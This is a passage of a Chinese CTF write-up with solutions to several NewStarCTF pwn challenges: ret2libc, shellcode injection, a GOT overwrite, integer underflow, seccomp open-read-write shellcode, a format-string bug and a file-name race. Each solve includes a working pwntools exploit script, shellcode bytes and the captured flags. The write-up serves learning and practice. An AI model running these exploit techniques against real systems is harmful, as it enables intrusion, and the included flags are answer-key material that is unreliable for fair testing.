
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF
  init(argc, argv, envp);
  puts("Glad to meet you again!What u bring to me this time?");
  fgets(s, 96, stdin);
  puts("Ok.See you!");
  return 0;
}
```

虽然`fgets()`函数限制了输入的字节数，但是并没有什么用，还是存在栈溢出漏洞。构造`payload`时`padding`一共需要`0x20+0x8`个字节才能覆盖到栈帧。

`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400753`，`ret`的地址是`0x40050e`。

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并利用`puts()`函数泄露`puts()`函数在`got`表中的真实地址。

编写`Python`代码，使用题目附件给的`libc-2.31.so`求解`libc`基地址，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`成功，`cat flag`得到`flag{a97738b3-773f-4299-bf67-5cfba5817cbf}`，提交即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27359)
elf = ELF('./pwn')
padding = b'a'*(0x20+0x8)
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400753 # pop rdi; ret
payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)
io.recvuntil('Ok.See you!\n')
tmp = io.recvline()[:-1]
puts_addr = u64(tmp.ljust(8, b'\x00'))
log.info('puts_addr => %s = %s' % (repr(tmp), hex(puts_addr)))
ret = 0x40050e # ret
libc = ELF('./libc-2.31.so')
libcbase = puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']
log.info('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh_addr))
payload = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)
io.interactive()
```

------

### ret2shellcode

先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2shellcode]
└─$ file ./pwn
./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0187c5cfc83d0e8e87248fa8b7b925fd559817bd, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2shellcode]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/ret2shellcode/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
  void *buf; // [rsp+28h] [rbp-8h]

  init(argc, argv, envp);
  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL); // prot=7 
  puts("Hello my friend.Any gift for me?");
  read(0, buf, 0x100uLL);
  puts("Anything else?");
  read(0, v4, 0x100uLL);
  puts("Ok.See you!");
  return 0;
}
```

注意到`mmap`函数，映射了一块起始地址为`0x233000`，长度为`0x1000uLL`的内存，`prot = 7`代表映射的内存可读可写可执行。

```c
void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);
/* start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。
 * length：代表将文件中多大的部分映射到内存。
 * prot：映射区域的保护方式。可以为以下几种方式的组合：
         PROT_EXEC 映射区域可被执行
         PROT_READ 映射区域可被读取
         PROT_WRITE 映射区域可被写入
         PROT_NONE 映射区域不能存取
 * flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。
         MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。
         MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。
         MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，对此区域作的任何修改都不会写回原来的文件内容。
         MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。
         MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。
         MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。
 * fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。
       有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。
 * offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。
 * 若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。
**/
// mmap(addr, len, prot, flags, fd, offset)
```

`shellcode`的构造如下：

```python
shellcode = '''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
'''
# shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
```

编写`Python`代码求解，将`shellcode`写入`buf`中，然后用`0x30+0x8`个字节填充`padding`覆盖到栈帧，将返回地址覆盖为`buf`的起始地址`0x233000`，拿到靶机`shell`权限后`cat flag`，提交`flag{f13f4a58-3293-4fae-a90b-c26fe0f71e5c}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27593)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
io.sendlineafter(b'Hello my friend.Any gift for me?\n', shellcode)
payload = b'a'*(0x30+0x8) + p64(0x233000)
io.sendlineafter(b'Anything else?\n', payload)
io.interactive()
```

------

### fallw1nd’s gift

先`file ./fallw1nd_gift `查看文件类型，再`checksec --file=./fallw1nd_gift`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/fallw1nd’s gift]
└─$ file ./fallw1nd_gift 
./fallw1nd_gift: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d1fe46636250f6e722c2df9769c4a30b3da9d2f7, for GNU/Linux 3.2.0, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/fallw1nd’s gift]
└─$ checksec --file=./fallw1nd_gift 
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/fallw1nd’s gift/fallw1nd_gift'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[1] = (void *)__readfsqword(0x28u);
  init(argc, argv, envp);
  puts("fallw1nd says you are the best pwnner,he will give you a gift as reward:");
  printf("%p", &puts);
  puts("\nnow input your addr:");
  __isoc99_scanf("%p", buf);
  puts("now input your content:");
  read(0, buf[0], 0x10uLL);
  puts("/bin/sh");
  exit(0);
}
```

程序直接用`printf`把`puts`函数的真实地址输出了，可以用这个地址来泄露`libc`基地址计算`system`函数的地址，`scanf("%p", buf);`这行代码可以到达任意一个地址，`read(0, buf[0], 0x10uLL);`能直接覆盖地址的内容。注意到程序中有行代码`puts("/bin/sh");`，我们可以考虑将`puts`的`got`表中存放的内容修改为`system`的地址，这样程序在执行`puts("/bin/sh");`时调用`puts_got`就会跳转到`system`的地址执行`system("/bin/sh")`，从而获得靶机的`shell`权限。`scanf("%p", buf)`只接收十六进制数，所以我们先把`puts`的`got`表所在地址赋值给`buf`，然后利用`read()`函数将`buf`中的内容修改为`system()`函数的地址，最后程序执行`system("/bin/sh")`。这题的一个坑就是`LibcSearcher`找到的`libc`版本都不对，用[**ret2libc**](#ret2libc)这题给出的`libc`能打通。编写`Python`代码求解，拿到靶机的`shell`权限后`cat flag`，提交`flag{ae50f983-a8e2-49fe-b4b3-b1f44033241e}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29776)
elf = ELF('./fallw1nd_gift')
io.recvuntil(b'fallw1nd says you are the best pwnner,he will give you a gift as reward:\n')
puts_addr = int(io.recvline()[:-1], 16)
log.info('puts_address => %#x' % puts_addr)
io.recvuntil(b'now input your addr:\n')
puts_got = elf.got['puts']
io.sendline(hex(puts_got))
libc = ELF('./libc-2.31.so')
libcbase = puts_addr - libc.symbols['puts']
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.symbols['system']
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = 0x402082
payload = p64(system_addr)
io.sendlineafter(b'now input your content:', payload)
io.interactive()
```

------

### uint32 and ret

先`file ./uint `查看文件类型，再`checksec --file=./uint`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/uint32 and ret]
└─$ file ./uint
./uint: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d653cac952aa813e9606cf34e1d680c4c354ee1d, for GNU/Linux 3.2.0, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/uint32 and ret]
└─$ checksec --file=./uint
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/uint32 and ret/uint'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`uint`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  puts("hello world");
  vuln();
  return 0;
}
```

双击`vuln()`函数查看详情，`read(0, buf, (unsigned int)nbytes)`这行语句可能造成栈溢出漏洞。 

```c
ssize_t vuln()
{
  char buf[72]; // [rsp+0h] [rbp-50h] BYREF
  int v2; // [rsp+48h] [rbp-8h] BYREF
  size_t nbytes; // [rsp+4Ch] [rbp-4h]

  LODWORD(nbytes) = 48;
  v2 = 0;
  puts("If you can find something is special,you are a half success!");
  __isoc99_scanf("%u", &v2);
  LODWORD(nbytes) = nbytes - v2;
  puts("twice");
  return read(0, buf, (unsigned int)nbytes);
}
```

我们先计算下`payload`需要多少个字符，在`Functions window`中看到`backdoor`函数的返回值是`system("/bin/sh")`，其相应地址为`0x4011be`，构造完的`payload`长度为`0x60`字节。

```python
from pwn import *

payload = b'a'*(0x50+0x8)+p64(0x4011be)
print(hex(len(payload))) # 0x60
```

`LODWORD(nbytes) = 48;`只有`0x30`字节，当用户输入的`v2`使得`0x30-v2`的无符号整型数值不小于`0x60`时就能造成栈溢出漏洞，`scanf`中`%u`是以`unsigned int`型读入正数，所以需要将占`4`字节的小端有符号整数`-48`转换成小端无符号整数`4294967248`，这样程序在执行完`LODWORD(nbytes) = nbytes - v2;`后的`(unsigned int)nbytes`数值就能为`0x60`，从而造成栈溢出漏洞。编写`Python`代码求解可得`flag{0fb641a6-ff72-4932-a281-2a00a91001e5}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25048)
io.recvuntil(b'If you can find something is special,you are a half success!\n')
n = int.from_bytes((-48).to_bytes(4, 'little', signed=True), 'little', signed=False) # 4294967248
io.sendline(str(n))
payload = b'a'*(0x50+0x8)+p64(0x4011be)
io.sendlineafter(b'twice\n', payload)
io.interactive()
```

------

### shellcode-revenge

先`file ./pwn `查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
└─$ file ./pwn
./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cbac893326c4db726742a35949dfbfb0fc23e24e, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/shellcode-revenge/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
  void *buf; // [rsp+28h] [rbp-8h]

  init(argc, argv, envp);
  sandbox();
  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Well.Just a little.");
  read(0, buf, 0x1AuLL);
  puts("Let's see what u can do this time~");
  read(0, v4, 0x100uLL);
  puts("See you!");
  return 0;
}
```

注意到`mmap`函数，映射了一块起始地址为`0x233000`，长度为`0x1000uLL`的内存，`prot = 7`代表映射的内存可读可写可执行。第一个`read`函数往该内存区域写入，第二个`read`函数能造成栈溢出漏洞。如果这题没有开启沙盒的话解题思路很简单，只需要先将`shellcode`写入`buf`中，再利用栈溢出漏洞把返回地址覆盖为shellcode的所在地址。

```c
void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);
/* start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。
 * length：代表将文件中多大的部分映射到内存。
 * prot：映射区域的保护方式。可以为以下几种方式的组合：
         PROT_EXEC 映射区域可被执行
         PROT_READ 映射区域可被读取
         PROT_WRITE 映射区域可被写入
         PROT_NONE 映射区域不能存取
 * flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。
         MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。
         MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。
         MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，对此区域作的任何修改都不会写回原来的文件内容。
         MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。
         MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。
         MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。
 * fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。
       有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。
 * offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。
 * 若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。
**/
// mmap(addr, len, prot, flags, fd, offset)
```

通过`seccomp-tools`可知不能调用系统函数`system`，我们需要利用`orw`来解题。第一个`read`函数只能读入`0x1a`字节，也就是说只能读入一个函数，因此我们可以先构造一个可以读取足够多字节的`read`。`payload = asm(shellcraft.read(0, '0x233014', 0x42))`的长度为`14`字节。接着利用第二个`read`函数构造栈溢出漏洞让程序执行写入到地址`0x233000`中的`read(0, '0x233014', 0x42)`，这样就能读入`orw`中的三个函数：`open`打开`flag`文件，`read`读取`flag`中的文件到`rsp`寄存器中，`write`将`rsp`中`flag`文件内容写入到标准输出中进行输出显示。只要`orw`是紧挨着`read`函数写入的，程序就能顺序执行，并不需要再`ret`跳转。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
└─$ seccomp-tools dump ./pwn      
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012
 0004: 0x15 0x07 0x00 0x0000009d  if (A == prctl) goto 0012
 0005: 0x15 0x06 0x00 0x00000038  if (A == clone) goto 0012
 0006: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0012
 0007: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0012
 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012
 0009: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0012
 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

编写`Python`代码求解可得`flag{e2b3063c-cead-4d25-8879-4b22ba877e23}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29841)
elf = ELF('./pwn')
payload = asm(shellcraft.read(0, '0x233014', 0x42)) # len(payload) = 14
io.sendlineafter(b'Well.Just a little.\n', payload)
payload = b'a'*(0x30+0x8) + p64(0x233000)
io.sendlineafter(b"Let's see what u can do this time~\n", payload)
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)
payload = asm(shellcode)
io.sendlineafter('See you!\n', payload)
io.interactive()
```

------

### 砍一刀

先`file ./pwn `查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/砍一刀]
└─$ file ./pwn           
./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e19953563c17da5e6a1207df964a0a86452cc335, for GNU/Linux 3.2.0, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/砍一刀]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/砍一刀/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

附件给出了`pwn.c`，可以直接看到其源码如下：

```c
#include<stdio.h>
#include<string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

int init();
void game();
void getcard();
void getdiamond();
void success();
int cipher();

int diamond=5;

int init(){
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
}

void game(){
    float money=0;
    int key=0;
    printf("NewstarCTF送你现金红包啦!\n\n");
    sleep(1.5);
    printf("恭喜你成为幸运星，最高可提现100元红包！\n\n");
    sleep(1.5);
    printf("恭喜你获得一张百元现金卡，使用可以加速领红包！\n\n");
    printf("按回车键使用现金卡……\n\n");
    getchar();
    sleep(1.5);
    printf("成功使用百元现金卡，获得50元现金！\n\n");
    money+=50;
    sleep(1.5);
    printf("今日难度降低，送你30元现金！\n\n");
    money+=30;
    sleep(1.5);
    printf("第一次参加活动，再送你10元现金！\n\n");
    money+=10;
    sleep(1.5);
    printf("感谢你对NewstarCTF的大力支持，再送你9元现金！\n\n");
    money+=9;
    sleep(1.5);
    printf("真棒！仅剩1%%提现红包！\n\n");
    sleep(1.5);
    printf("还有66人正在提现红包，你的提现进度第一，将最先提现！\n\n");
    sleep(1.5);
    printf("回车一下，再砍一刀\n\n");
    getchar();
    sleep(1.5);
    printf("恭喜获得0.45元现金！\n\n");
    sleep(1.5);
    printf("送你现金翻倍卡，更快提现！\n\n");
    sleep(1.5);
    printf("翻倍生效中……成功翻2倍！\n0.45元----->0.9元\n\n");
    money+=0.9;
    sleep(1.5);
    printf("距离提现只有一步之遥啦，输入口令666领取红包！\n");
    cipher();
    printf("\n口令正确，送你0.05元现金！\n\n");
    sleep(1.5);
    printf("翻倍生效中……成功翻2倍！\n0.05元----->0.1元\n\n");
    money+=0.1;
    sleep(1.5);
    printf("恭喜你集齐100元红包！\n\n");
    sleep(1.5);
    printf("赶紧分享给好友庆祝一下吧！\n\n");
    sleep(1.5);
    printf("按回车键分享给好友~\n\n");
    getchar();
    printf("分享成功！\n\n");
    getcard();
}

void getcard(){
    srand((unsigned int)time(NULL));
    int luck=0;
    int coin=0;
    printf("有好友帮你砍一刀，成功获得500金币！\n");
    coin+=500;
    sleep(1.5);
    printf("有好友帮你砍一刀，成功获得400金币！\n");
    coin+=400;
    sleep(1.5);
    printf("=======================================\n");
    printf("集齐1000金币，兑换提现卡，马上提现红包！\n");
    printf("=======================================\n");
    sleep(1.5);
    printf("马上就能兑换提现卡啦，赶紧邀请好友帮你砍一刀吧！\n");
    printf("当前金币：%d个\n\n",coin);
    while(1){
        printf("按回车键邀请好友砍一刀，领取金币~\n");
        getchar();
        sleep(1);
        printf("有好友帮你砍一刀啦!");
        if(coin==999){
            luck=rand()%101;
            if((luck%10)==0){
                printf("==========================================================\n");
                printf("恭喜你触发隐藏福利，集齐10颗钻石兑换1金币，加速兑换提现卡！\n");
                printf("==========================================================\n");
                getdiamond();
            }
            else{
                printf("很遗憾本次未获得金币……\n");
            }
        }
        else{
            if(coin>=900&&coin<990){
                printf("成功获得10金币……\n");
                coin+=10;
            }
            else{
                printf("成功获得1金币……\n");
                coin+=1;
            }
        }
        printf("当前金币：%d个\n\n",coin);
    }
}   

void getdiamond(){
    int luck=0;
    char password[100];
    printf("======================\n");
    printf("你真幸运，送你5颗钻石！\n");
    printf("======================\n");
    sleep(1.5);
    printf("马上就能集齐钻石啦，赶紧邀请好友帮你砍一刀吧！\n\n");
    while(1){
        if(diamond==10){
            success();
        }
        else{
            printf("按回车键邀请好友砍一刀，领取钻石~\n");
            getchar();
            sleep(1);
            printf("有好友帮你砍一刀啦!");
            if(diamond==9){
                luck=rand()%101;
                if((luck%10)==0){
                    printf("===============================================================\n");
                    printf("你意外触发了隐藏福利！离成功就差一点点啦，输入神秘口令领取钻石！\n");
                    printf("===============================================================\n");
                    sleep(1);
                    printf("输入口令==>");
                    init();
                    read(0,password,101);
                    printf(password);
                }
                else{
                    printf("很遗憾本次未获得钻石……\n");
                }
            }
            else{
                printf("成功获得1钻石！\n");
                diamond+=1;
            }
        }
        printf("当前钻石：%d颗\n\n",diamond);
    }
}

void success(){
    printf("===================\n");
    printf("恭喜你集齐10颗钻石！\n");
    printf("===================\n");
    sleep(1.5);
    printf("按回车键兑换金币！\n\n");
    sleep(1.5);
    printf("金币兑换成功！\n\n");
    sleep(1.5);
    printf("===================\n");
    printf("恭喜你集齐1000金币！\n");
    printf("===================\n");
    sleep(1.5);
    printf("按回车键兑换提现卡！\n\n");
    sleep(1.5);
    printf("提现卡兑换成功！\n\n");
    sleep(1.5);
    printf("正在使用提现卡");
    sleep(1.5);
    printf("...");
    sleep(1.5);
    printf("...");
    sleep(1.5);
    printf("...\n");
    sleep(1.5);
    printf("恭喜你成功提现红包！正在飞速转账~");
    sleep(1.5);
    printf("...");
    sleep(1.5);
    printf("...\n");
    printf("转账成功！\n");
    system("/bin/sh");
}

int cipher()
{
    printf("==>");
    int n, judge;
    scanf("%d", &n);
    judge = getchar();
    while(n != 666)
    {
        fflush(stdin);
        printf("口令错误，请重新输入\n==>");
        scanf("%d", &n);
        judge = getchar();
    }
    return n;
}

int main(){
    init();
    game();
}
```

编写`Python`代码求解可得`flag{36fd0fba-210e-4cfe-9e73-947e94bea761}`。

```python
from pwn import *

# context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25352)
io.send(b'\x00')
io.send(b'\x00')
io.sendlineafter(b'==>', b'666')
while True:
    tmp = io.recvuntil(b'~')
    log.info(tmp)
    io.send(b'\x00')
    io.recvline()
    tmp = io.recvline()
    if b'=' in tmp:
        log.info(tmp)
        break
while True:
    tmp = io.recvuntil(b'~')
    log.info(tmp)
    io.send(b'\x00')
    io.recvline()
    tmp = io.recvline()
    if b'=' in tmp:
        log.info(tmp)
        break
log.info(io.recvuntil(b'==>'))
# payload = b'%p'*0x20 + p64(0x404090) # 得到首地址偏移量16
payload = b'aaaaaaaaaa%16$na' + b'%p'*0x18 + p64(0x404090) # 定位到参数在栈上的位置以修改内容
io.sendline(payload)
log.info(io.recv())
io.interactive()
```

------

### cat flag

先`file ./pwn `查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/cat flag]
└─$ file ./pwn
./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5e9560a621c83466c0a8427a73c1de760af1fe40, for GNU/Linux 3.2.0, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/cat flag]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/cat flag/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  menu();
}
```

双击`menu()`函数查看详情，发现程序有`4`个功能。

```c
void __noreturn menu()
{
  int v0; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  v0 = 0;
  while ( 1 )
  {
    puts("\nchoose a command you want to execute.\n");
    puts("1-ls");
    puts("2-cat");
    puts("3-mv");
    puts("4-exit");
    printf("==>");
    __isoc99_scanf("%d", &v0);
    getchar();
    if ( v0 == 4 )
      break;
    if ( v0 <= 4 )
    {
      switch ( v0 )
      {
        case 3:
          editname();
          break;
        case 1:
          ls();
          break;
        case 2:
          cat();
          break;
      }
    }
  }
  exit(0);
}
```

双击`ls()`函数查看详情，系统调用`ls`功能。

```c
int ls()
{
  return system("ls");
}
```

双击`cat()`函数查看详情，先是输入一个文件名，如果文件名中不包含`.`和`/`的话，就开启一个新线程执行`cating`函数。

```c
int cat()
{
  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF

  newthread[1] = __readfsqword(0x28u);
  puts("Input the file name you want to cat.");
  read(0, name, 0x14uLL);
  if ( strchr(name, '.') || strchr(name, '/') )
    return printf("You bad bad~");
  name[strlen(name) - 1] = 0;
  if ( access(name, 0) )
    puts("The file does not exist");
  else
    pthread_create(newthread, 0LL, cating, 0LL);
  return 0;
}
```

`cating`函数首先判断输入的文件名`name`是否包含子串`"flag"`，如果包含`"flag"`的话就不打印文件，否则休息`1`秒后再打印文件。

```c
int __fastcall cating(void *a1)
{
  char dest[8]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v3; // [rsp+8h] [rbp-18h]
  __int64 v4; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( strstr(name, "flag") )
    return puts("nonono,you don't have permission to cat this file!");
  *(_QWORD *)dest = 544498019LL;
  v3 = 0LL;
  v4 = 0LL;
  sleep(1u);
  strcat(dest, name);
  system(dest);
  return 0;
}
```

返回`menu()`函数，双击`editname()`函数查看详情。

```c
ssize_t editname()
{
  puts("Input new name you want to change.");
  return read(0, name, 0x14uLL);
}
```

因为`cat`函数打印文件时开启了新线程，所以我们在调用`cat`函数后再修改`name`中的内容时，线程中`name`的内容也能随之改变。编写`Python`代码求解得到`flag{c35c2250-d53a-4ccf-bd23-ca83bd33c38c}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25260)
io.sendlineafter(b'==>', b'2')
io.sendlineafter(b'Input the file name you want to cat.\n', b'bin')
io.sendlineafter(b'==>', b'3')
io.sendlineafter(b'Input new name you want to change.\n', b'flag')
io.interactive()
```

------

### ♥ sheep a flag

先`file ./sheep_a_flag `查看文件类型，再`checksec --file=./sheep_a_flag`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/sheep a flag]
└─$ file ./sheep_a_flag
./sheep_a_flag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=36f054c25f8da1dfdddf7cf8ee09561038a6bd51, stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/sheep a flag]
└─$ checksec --file=./sheep_a_flag
